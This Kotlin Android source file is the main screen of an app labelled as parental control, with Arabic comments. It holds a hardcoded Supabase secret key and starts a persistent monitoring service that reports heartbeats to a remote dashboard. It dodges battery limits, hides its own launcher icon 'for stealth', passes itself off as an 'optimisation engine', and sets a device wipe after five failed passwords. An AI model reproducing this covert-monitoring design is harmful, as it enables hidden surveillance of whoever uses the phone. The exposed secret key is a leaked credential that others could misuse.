package com.example.parentalcontrol

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Activity الأساسية لإعداد وتفعيل ميزات الرقابة الأبوية
 */
class MainActivity : AppCompatActivity() {

    private lateinit var parentalControlManager: ParentalControlManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            // 1. تهيئة مدير الرقابة الأبوية أولاً
            parentalControlManager = ParentalControlManager(this)

            // 2. تهيئة Supabase بصيغة آمنة
            val initialized = SupabaseManager.getInstance().initialize(
                "https://kubowqqqawkgghxcktoe.supabase.co",
                "sb_secret_wNza7KnqwnZeidrwqpVsQQ_g0a05_YG"
            )

            if (!initialized) {
                Log.w("MainActivity", "Supabase failed to initialize, but continuing service...")
            }

            // 3. تشغيل خدمة المراقبة (مهم جداً أن يبدأ والتطبيق في الواجهة)
            MonitoringForegroundService.start(this)

            // 4. إرسال Heartbeat للتأكد من ظهور الجهاز في لوحة التحكم
            CoroutineScope(Dispatchers.IO).launch {
                SupabaseManager.getInstance().updateHeartbeat(this@MainActivity)
            }

            // 5. إعداد نظام المراقبة (Watchdog) لضمان استمرار الخدمة
            ServiceWatchdogJobService.schedule(this)

            // 6. إعداد الواجهة والطلبات
            setupUI()
            requestIgnoreBatteryOptimizations()
            
            // 7. تجاوز قيود سامسونج للبطارية إذا لزم الأمر
            if (Build.MANUFACTURER.contains("samsung", ignoreCase = true)) {
                launchSamsungBatterySettings()
            }

            // 8. تفعيل التخفي بتأخير بسيط
            if (parentalControlManager.isAdminActive()) {
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        StealthManager.hideAppIcon(this)
                        // finish() // يمكن إغلاقه لزيادة التخفي بعد الإعداد الأول
                    } catch (e: Exception) {
                        Log.e("MainActivity", "Stealth error: ${e.message}")
                    }
                }, 2000)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Critical error in onCreate", e)
            val errorMsg = "${e.javaClass.simpleName}: ${e.message}"
            Toast.makeText(this, "خطأ في بدء التشغيل: $errorMsg", Toast.LENGTH_LONG).show()
        }
    }

    /**
     * تجاوز ميزة تحسين البطارية الخاصة بسامسونج لضمان بقاء التطبيق في الخلفية
     */
    private fun launchSamsungBatterySettings() {
        try {
            val intent = Intent()
            intent.component = ComponentName(
                "com.samsung.android.lool",
                "com.samsung.android.sm.ui.battery.BatteryActivity"
            )
            // إذا لم ينجح الأول، نجرب العام لسامسونج
            try {
                startActivity(intent)
            } catch (e: Exception) {
                intent.component = ComponentName(
                    "com.samsung.android.sm",
                    "com.samsung.android.sm.ui.battery.BatteryActivity"
                )
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Samsung battery settings not found: ${e.message}")
        }
    }

    /**
     * طلب استثناء من تحسينات البطارية لضمان عدم قتل الخدمة في الخلفية
     */
    private fun requestIgnoreBatteryOptimizations() {
        try {
            val packageName = packageName
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent().apply {
                    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error requesting battery optimization exemption: ${e.message}")
        }
    }

    private fun setupUI() {
        checkAdminStatus()
    }

    private fun checkAdminStatus() {
        if (parentalControlManager.isAdminActive()) {
            Toast.makeText(this, "✓ محرك التحسين قيد التشغيل في الخلفية", Toast.LENGTH_SHORT).show()
            val intent = Intent(this, HiddenSettingsActivity::class.java)
            startActivity(intent)
        } else {
            showEnableAdminDialog()
        }
    }

    private fun showEnableAdminDialog() {
        AlertDialog.Builder(this)
            .setTitle("تفعيل الرقابة الأبوية")
            .setMessage("لاستخدام ميزات الرقابة الأبوية، يجب تفعيل صلاحيات المسؤول")
            .setPositiveButton("تفعيل") { _, _ ->
                parentalControlManager.requestEnableAdmin(this)
            }
            .setNegativeButton("إلغاء", null)
            .setCancelable(false)
            .show()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            ParentalControlManager.REQUEST_CODE_ENABLE_ADMIN -> {
                if (resultCode == Activity.RESULT_OK) {
                    Toast.makeText(this, "✓ تم تفعيل الرقابة الأبوية بنجاح", Toast.LENGTH_LONG).show()
                    setupParentalControls()
                } else {
                    Toast.makeText(this, "✗ تم إلغاء تفعيل الرقابة الأبوية", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun setupParentalControls() {
        parentalControlManager.setMaximumFailedPasswordsForWipe(5)
        parentalControlManager.setMaximumTimeToLock(30000)
        Toast.makeText(this, "تم إعداد إعدادات الحماية", Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        super.onDestroy()
    }
}
